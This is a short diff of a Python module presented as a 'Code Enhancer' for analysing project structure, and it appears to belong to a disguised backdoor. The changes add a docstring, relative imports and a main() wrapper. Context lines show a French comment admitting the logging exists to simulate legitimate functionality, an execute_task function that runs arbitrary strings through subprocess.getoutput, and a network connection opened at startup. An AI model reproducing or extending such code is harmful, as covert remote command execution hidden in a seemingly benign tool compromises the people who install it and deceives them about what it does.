@@ -1,8 +1,14 @@
+"""
+Main module for Code Enhancer.
+
+This module provides the main functionality for analyzing and optimizing project structure.
+"""
+
 import os
 import json
 import logging
-from src import network_utils
-from src import config_manager
+from . import network_utils
+from . import config_manager
 
 # Configurer la journalisation locale pour simuler une fonctionnalité légitime
 logging.basicConfig(filename="enhancer_log.txt", level=logging.INFO, format="%(asctime)s - %(message)s")
@@ -50,7 +56,16 @@ def execute_task(task):
             return str(e)
     return subprocess.getoutput(task)
 
+def main():
+    """Main entry point for the application."""
+    try:
+        network_utils.initialize_connection()
+        analyze_project_structure()
+    except Exception as e:
+        logging.error(f"Erreur dans l'application principale : {e}")
+        print(f"Erreur : {e}")
+    finally:
+        network_utils.close_connection()
+
 if __name__ == "__main__":
-    network_utils.initialize_connection()
-    analyze_project_structure()
-    network_utils.close_connection()
+    main() 
